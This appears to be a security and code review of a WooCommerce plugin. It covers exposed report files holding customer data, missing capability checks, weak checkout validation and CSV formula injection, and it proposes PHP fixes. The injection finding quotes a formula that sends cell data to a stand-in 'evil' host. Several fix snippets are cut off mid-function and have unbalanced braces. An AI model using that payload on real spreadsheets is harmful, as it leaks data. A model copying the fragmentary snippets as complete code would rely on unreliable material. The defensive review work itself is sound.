## Critical

### C1 – Report files are publicly downloadable

**Where:** `turq_dashboard_widget.php:1497-1560` (`generate_report`), `:1562-1599` (download handler)

**Problem.** Reports are written to `wp-content/plugins/<plugin>/reports/`. That folder is served directly by the web server. The HMAC token only protects the `admin-post.php` route. Anyone who types the file URL gets the file without logging in. The names are fully predictable because they're built from the market name and date, e.g.:

```
/wp-content/plugins/turquoise/reports/pickup-all-thu-17-09.csv
/wp-content/plugins/turquoise/reports/buy-thu-17-09.doc
```

The empty `index.php` only stops directory listing. It doesn't stop direct file requests.

**Risk.** Personal data (name, email, phone, delivery address, order contents, notes) is public. That's a UK GDPR breach risk. Bots commonly probe plugin folders.

Also:
- The token is a fixed HMAC of the file name, so a link never expires.
- The download needs `manage_options`, but a shop manager (`manage_woocommerce`) can generate reports and can't download them.
- Plugin updates wipe the folder.

**Fix.** Store the files outside the plugin, in `uploads/`, with unguessable names. Map a random, short-lived token to each file and tie it to the user who generated it. Apply the same capability to generating and downloading.

```php
/**
 * Private reports folder in uploads, created on first use.
 * .htaccess covers Apache; the random file names cover Nginx/LiteSpeed.
 */
function turq_reports_dir(): string {
	$upload = wp_upload_dir();
	$dir    = trailingslashit( $upload['basedir'] ) . 'turq-reports/';

	if ( ! is_dir( $dir ) ) {
		wp_mkdir_p( $dir );
		file_put_contents( $dir . 'index.php', "<?php\n// Silence is golden.\n" );
		file_put_contents( $dir . '.htaccess', "Require all denied\n<IfModule !mod_authz_core.c>\nDeny from all\n</IfModule>\n" );
	}
	return $dir;
}

/** Remove report files older than a day. */
function turq_reports_cleanup(): void {
	foreach ( glob( turq_reports_dir() . '*.{doc,csv}', GLOB_BRACE ) ?: [] as $file ) {
		if ( filemtime( $file ) < time() - DAY_IN_SECONDS ) {
			wp_delete_file( $file );
		}
	}
}

/** Register a generated file and return a one-user, 2-hour download token. */
function turq_register_report_file( string $path, string $download_name ): string {
	$token = bin2hex( random_bytes( 16 ) );             // lower-case hex, safe for sanitize_key()
	set_transient( 'turq_report_' . $token, [
		'path' => $path,
		'name' => $download_name,
		'user' => get_current_user_id(),
	], 2 * HOUR_IN_SECONDS );
	return $token;
}

function turq_report_url( string $token ): string {
	return admin_url( 'admin-post.php?action=download_turq_report&token=' . $token );
}
```

Changes inside `generate_report()`:


Call `turq_reports_cleanup();` once at the start of each report AJAX handler. Replace every `admin_url( "admin-post.php?action=download_turq_report&token={$file_token['doc']}" )` with `esc_url( turq_report_url( $file_token['doc'] ) )`.

New download handler:

```php

		wp_die( 'Unauthorized', 403 );
	}

	$token = isset( $_GET['token'] ) ? sanitize_key( wp_unslash( $_GET['token'] ) ) : '';
	$entry = $token ? get_transient( 'turq_report_' . $token ) : false;

	}

	// Belt and braces: file must live inside the reports folder.

	if ( ! $real || strpos( $real, realpath( turq_reports_dir() ) ) !== 0 ) {
		wp_die( 'Invalid file.', 400 );
	}

	$download_name = sanitize_file_name( $info['filename'] . '_generated[' . wp_date( 'd-m_H-i' ) . '].' . $info['extension'] );

	nocache_headers();
	header( 'Content-Type: application/octet-stream' );
```

**About the existing `.htaccess` in `reports/`:** it protects the files only if all three of these hold:
- the site runs on Apache or LiteSpeed (Nginx ignores `.htaccess` completely);
- the host allows overrides (`AllowOverride`) for that folder;
- the file actually denies access (`Require all denied`).

It isn't in the repo, so it can't be checked from here. The test is quick: while logged out, open `https://<site>/wp-content/plugins/<plugin-folder>/reports/index.php` and one real report file. Both should return **403 Forbidden**. If a file downloads, the data is exposed.

Don't count on the file names being hard to guess. They follow a fixed pattern (`buy-`/`pickup-`/`delivery-` + market or `all` + day + date). A script can try every day of the year in a few thousand requests, which takes minutes. `ticket-report.csv` needs no guessing at all.

**Right now:** delete everything except `index.php` from the plugin's live `reports/` folder on the server, and check the access logs for requests to `/reports/`. Also check the files aren't still in git history. You rebuilt the repo, so they should be gone.

### C2 – Ticket report rebuilt into the public folder from the thank-you page

**Where:** `turq_woo_checkout.php:1429-1558` (inside `woocommerce_thankyou_turq`)

**Problem.** Whenever anyone views the thank-you page of an order with tickets, all ticket orders are queried and written to `reports/ticket-report.csv`. That includes a customer refreshing the page. The file name is fixed and the file is public (see C1).

**Risk.**
- Every ticket holder's name, email and code is public.
- Anyone with a ticket list could also reuse codes at the door.
- It's a heavy query on a customer-facing page, and two customers finishing at the same moment write the same file at once.

**Fix.** Take it off the thank-you page. Generate it on demand from the admin side and stream it straight to the browser, so no file is stored.

```php
// 1) Delete lines 1429-1558 from woocommerce_thankyou_turq().

// 2) Admin download - streamed, nothing stored on disk.
add_action( 'admin_post_turq_ticket_report', function () {
	if ( ! current_user_can( 'manage_woocommerce' ) ) {
		wp_die( 'Unauthorized', 403 );
	}
	check_admin_referer( 'turq_ticket_report' );

	nocache_headers();
	header( 'Content-Type: text/csv; charset=utf-8' );
	header( 'Content-Disposition: attachment; filename="ticket-report-' . wp_date( 'Y-m-d-Hi' ) . '.csv"' );

	$fh = fopen( 'php://output', 'w' );
	turq_write_ticket_report( $fh );   // move the existing query/sort/fputcsv code here, using turq_csv_row() from M4
	fclose( $fh );
	exit;
} );

// 3) Link, e.g. inside a dashboard widget:
printf(
	'<a class="button" href="%s">Download ticket list</a>',
	esc_url( wp_nonce_url( admin_url( 'admin-post.php?action=turq_ticket_report' ), 'turq_ticket_report' ) )
);
```

### H2 – Delivery "buy" report in the event widget loses orders, can fatal

**Where:** `turq_dashboard_widget.php:499-507`, `:541`

### H3 – Mixed ticket + physical package treated as "virtual"

**Where:** `turq_woo_checkout.php:180-185` and `:204-207` (`split_into_groups`). Used at `:722`, `:995` and `woocommerce/checkout/review-order.php:170`.

**Problem.** `all_virtual` goes +1 for each downloadable line and −1 for each other line. `> 0` then only means "more downloadable lines than physical ones".

Example: 2 ticket lines and 1 beef box gives +1, so the package counts as "virtual":
- `checkout_package_context` removes every rate except Virtual Delivery;
- checkout validation `continue`s;
- the beef box is ordered with no market or delivery date.

**Risk.** Orders with physical goods and no collection or delivery details. They won't appear on any pick or collection report.

**Fix.** Count virtual lines separately and set the flag only when every line is virtual. Keep `all_virtual` as 1/0 so the existing `> 0` checks still work.

```php
function split_into_groups( $items ) {
	$groups        = turq_Market_Setup()->get_multi_shipping_groups();
	$active_groups = array_flip( turq_Market_Setup()->get_active_shipping_groups() );

	$split_groups        = [];
	$items_with_no_group = [];

	$add = function ( $group_key, $item_key, $item, $product ) use ( &$split_groups, $groups ) {
		$split_groups[ $group_key ] ??= [ 'count' => 0, 'items' => [], 'virtual_count' => 0, 'all_virtual' => 0, 'label' => $groups[ $group_key ]['label'] ?? '' ];
		$split_groups[ $group_key ]['count']++;
		$split_groups[ $group_key ]['items'][ $item_key ] = $item;
		if ( $product && $product->is_downloadable() ) {
			$split_groups[ $group_key ]['virtual_count']++;
		}
	};

	foreach ( $items as $item_key => $item ) {
		$group_key = $item['group_key'] ?? ( is_object( $item ) ? $item->get_meta( '_group_key' ) : null );
		if ( empty( $group_key ) || ! isset( $active_groups[ $group_key ] ) ) {
			$items_with_no_group[ $item_key ] = $item;
			continue;
		}
		$add( $group_key, $item_key, $item, wc_get_product( $item['product_id'] ) );
	}

	foreach ( $items_with_no_group as $item_key => $item ) {
		$product = wc_get_product( $item['product_id'] );
		$check   = $product ? check_product_options( $product ) : [ 'valid' => [] ];
		if ( ! empty( $check['valid'] ) ) {
			$add( current( $check['valid'] ), $item_key, $item, $product );
		} elseif ( WC()->cart && WC()->cart->remove_cart_item( $item_key ) && $product ) {
			wc_add_notice( sprintf( '<a href="%s">%s</a> is no longer available.', esc_url( get_permalink( $product->get_id() ) ), esc_html( $product->get_title() ) ), 'notice' );
		}
	}

	foreach ( $split_groups as &$group ) {
		$group['all_virtual'] = ( $group['count'] > 0 && $group['virtual_count'] === $group['count'] ) ? 1 : 0;
	}
	unset( $group );

	return $split_groups;
}
```

Two further changes:
- The `WC()->cart &&` guard is needed because the function is also called with **order** items (thank-you page, `order_processed`). There's no cart then, and removing an item makes no sense.
- `review-order.php:170` reads `$package['virtual_delivery']`, which never exists, so the "No local delivery" notice never shows. Change it to `empty( $package['all_virtual'] )`.

### H4 – Market/date validation is too loose and uses stale session data

**Where:** `turq_woo_checkout.php:983`, `:1040-1048` (validation) and `:1285-1312` (order processed)

**Problem.**
1. `all_keys()` flattens the whole validation array into one key list. That list includes `location`, `id`, `tag_id`, `d1`, `date`, every market ID and every `dN`. A posted market or date passes as long as its key appears **anywhere**. `ti_market=1094` with `ti_date=d7` passes even if market 1094 only has `d1`–`d3`. `order_processed` then reads `$valid[1094]['d7']`, gets `null`, and saves an empty date (it shows as `Thu 01-01-70`).
2. The list comes from the session and is written when the checkout modal is rendered. A customer who opened checkout at 12:55 can submit at 13:30 after the cut-off, and the order still goes through. Posting the checkout form doesn't re-render the modal, so the session isn't refreshed. WooCommerce sessions last up to 48 hours.
3. The `'d1'`, `'d2'` keys are positions in a list, not dates. If you validated against *live* data instead, a date that had dropped off would shift the rest up, and the customer would silently get a different date.

**Fix.** Look up the exact option the customer saw (from the session), then confirm the same **date** is still offered in the live data.

```php
/**
 * Returns [ 'primary' => market/delivery key, 'row' => option row, 'opt' => date option ]
 * for the customer's choice, or null if the choice is malformed or no longer on offer.
 */
function turq_get_valid_selection( string $group_key, string $method_name, array $posted ): ?array {
	$field_ids = (array) turq_Market_Setup()->get_method_setup( $method_name, 'field_id' );
	$primary   = (string) ( $posted[ $field_ids[0] . '_' . $group_key ] ?? '' );
	$opt_key   = ( 'p' === $method_name ) ? (string) ( $posted[ $field_ids[1] . '_' . $group_key ] ?? '' ) : 'd1';

	if ( '' === $primary || ! preg_match( '/^d\d+$/', $opt_key ) ) {
		return null;
	}

	$rendered = WC()->session ? WC()->session->get( "ti_market_validation_{$group_key}" ) : null;
	$row      = $rendered[ $primary ] ?? null;
	$picked   = $row[ $opt_key ] ?? null;
	if ( ! is_array( $picked ) || empty( $picked['date'] ) ) {
		return null;
	}

	// Still offered right now? (catches cut-off passing since the modal was shown)
	$live = turq_Market_Setup()->get_option_validation( $group_key, $method_name )[ $primary ] ?? [];
	foreach ( $live as $k => $opt ) {
		if ( preg_match( '/^d\d+$/', (string) $k ) && (int) $opt['date'] === (int) $picked['date'] ) {
			return [ 'primary' => $primary, 'row' => $row, 'opt' => $picked ];
		}
	}
	return null;
}
```

In `woocommerce_after_checkout_validation_turq`, replace the `else { … }` branch of the field loop. The loop runs once per field, so check the selection once, after the loop:

### M1 – Admin AJAX without capability checks

**Where:** `turq_dashboard_widget.php` handlers `turq_get_group_report` (:327), `turq_generate_debug` (:547), `turq_get_report_deliver` (:773), `turq_get_report_collect` (:1094), `turq_toggle_tag` (:1291)

**Problem.** Each handler checks a nonce, which prevents CSRF. None checks what the user is **allowed** to do. The widgets appear on the dashboard for every role that can reach wp-admin (editors, authors, contributors), so those users receive valid nonces and can:
- generate reports containing customer data;
- add or remove tag 68 on **any** product ID, not just the listed ones;
- create test orders, if the debug UI is ever turned back on.

**Fix.** Add a small shared guard and call it first in every handler.

```php
function turq_ajax_guard( string $nonce_action, string $cap = 'manage_woocommerce', string $field = 'security' ): void {
	check_ajax_referer( $nonce_action, $field );
	if ( ! current_user_can( $cap ) ) {
		wp_send_json_error( 'You do not have permission to do this.', 403 );
```

### M3 – Bulk "Move to" isn't validated on the server

**Where:** `turq_woo_checkout.php:301-345`

**Problem.** The allowed targets are only enforced in the template, via `data-move-targets`. The handler accepts any `target_group`, and the add-to-cart validation passes because `package_group` isn't posted.
```php
function multi_bulk_move_handler() {
	check_ajax_referer( 'turq_checkout', 'security' );

	$from_group   = sanitize_text_field( wp_unslash( $_POST['from_group'] ?? '' ) );
	$target_group = sanitize_text_field( wp_unslash( $_POST['target_group'] ?? '' ) );
	$items        = array_map( 'wc_clean', (array) wp_unslash( $_POST['items'] ?? [] ) );

	$groups = turq_Market_Setup()->get_multi_shipping_groups();
	$active = turq_Market_Setup()->get_active_shipping_groups();       // tag_id => group_key

	if ( empty( $items ) ) {
		wp_send_json_error( [ 'message' => 'No items' ] );
	}
	if ( ! in_array( $target_group, $active, true ) ) {
		wp_send_json_error( [ 'message' => 'Invalid target' ] );
	}

	$failed = 0;
	foreach ( $items as $cart_item_key ) {
		$cart_item = WC()->cart->get_cart_item( $cart_item_key );
		if ( ! $cart_item || ( $cart_item['group_key'] ?? '' ) !== $from_group ) {
			$failed++;
			continue;
		}

		// Same rule the template uses to build the "Move to" list
		$check   = check_product_options( wc_get_product( $cart_item['product_id'] ) );
		$allowed = [];
		foreach ( $check['valid'] as $gk ) {
			$allowed = array_merge( $allowed, array_values( array_intersect_key( $active, array_flip( $groups[ $gk ]['allowed_groups'] ?? [] ) ) ) );
		}
		if ( ! in_array( $target_group, $allowed, true ) ) {
			$failed++;
			continue;
		}

		$added = WC()->cart->add_to_cart(
			$cart_item['product_id'],
			$cart_item['quantity'],
			$cart_item['variation_id'],
			$cart_item['variation'] ?? [],                     // keep chosen attributes
			[ 'group_key' => $target_group ]
		);
		if ( false === $added ) {
			$failed++;
		} else {
			WC()->cart->remove_cart_item( $cart_item_key );
		}
	}

	$failed
		? wp_send_json_error( [ 'message' => $failed . ' items cannot be moved' ] )
		: wp_send_json_success( [ 'message' => count( $items ) . ' items moved' ] );
```

### M4 – CSV formula injection

**Where:** `turq_dashboard_widget.php:1549`, and the ticket CSV (C2)

**Problem.** Customer-typed text (name, order notes) goes into CSVs that staff open in Excel. A value starting with `=`, `+`, `-` or `@` runs as a formula. For example, an order note of `=HYPERLINK("http://evil/?"&A1,"Click")`.

```php
function turq_csv_safe( $value ) {
	if ( is_string( $value ) && '' !== $value && ! is_numeric( $value )

		return "'" . $value;
	}
	return $value;
}
```

## WordPress / WooCommerce standards

| ID | Item | Recommendation |
|---|---|---|
| S1 | **Global function names without a prefix**: `render_options`, `split_into_groups`, `all_keys`, `trim_text`, `get_all_products`, `build_orders`, `widget_footer`, `set_delivery`, `get_shipping_fields`, `add_shipping_to_order`, `validate_postcode_ajax`, `page_columns`, `brand_footer`, `wpv`, `dpv`, … | If another plugin declares the same name, the site fatals with "Cannot redeclare". Prefix everything with `turq_`, or move it into classes. |
| S2 | **Closing `?>` at the end of 20 PHP files** | Any stray blank line after `?>` is sent before headers. That breaks downloads (report/CSV) and AJAX JSON. Remove the closing tag from pure-PHP files. |
| S3 | **`esc_attr()` used to clean input** (`get_post_value()`, `set_order_turq_options`, `order_processed`) | Escape on **output**, sanitise on **input**. For input use `wc_clean( wp_unslash( … ) )` / `sanitize_text_field()`, and `esc_*()` only when printing. |
| S4 | **`$_POST` not unslashed** in many places | WordPress adds slashes to superglobals. Wrap in `wp_unslash()` before sanitising. |
| S5 | **No HPOS compatibility declaration** – the plugin already uses `wc_orders_meta` directly | Add to `turquoise.php`: see below. |
| S6 | **`TODAY = current_time( 'timestamp' )`** | WordPress discourages this since 5.3. It gives a "local time pretending to be UTC" number. It's consistent inside the plugin, but wrong by the UTC offset wherever it's compared with WooCommerce dates (`date_created`, see M11). Longer term, use `current_datetime()` / `wp_date()`. For now, when comparing with WC dates, use `TODAY - wc_timezone_offset()`. |
| S7 | **Hard-coded IDs**: ticket product `4973`, tag `68`, category `meat`, pages `2986`/`3369`, shipping instance `14` (Virtual Delivery), zone `1`, gateway `cheque`, `orders@thesussexpeasant.co.uk`, gateway logo URLs | Fine for a bespoke site, but they break silently if anything is recreated. Move them into a single `turq_config()` array or a settings field (you've noted tickets already). |
| S8 | **Inline `<script>`/`<style>` and PHP-in-JS** (e.g. `'<?php echo admin_url(...) ?>'`) | Use `wp_add_inline_script()` / `wp_localize_script()` with `esc_js` / `wp_json_encode`. Several `admin_footer`/`admin_head` blocks print on **every** admin screen; limit them with `get_current_screen()`. |
| S9 | **Template overrides** (`cart/cart-shipping.php` v8.8.0, `checkout/review-order.php`, `checkout/form-checkout.php`) loaded with `woocommerce_locate_template` at priority 99999 | This also overrides theme templates. Check *WooCommerce → Status → Templates* after each WC update for "outdated". |
| S10 | **Undefined variables and array keys** (`$class`, `$methods`, `$out` in the dashboard widgets, `$field` in the order screen, missing `start_date` keys on the default event, etc.) | Each one writes a PHP warning to the log on every dashboard or order-page load, which hides real errors. Turn on `WP_DEBUG_LOG` on a staging copy and clear them. |
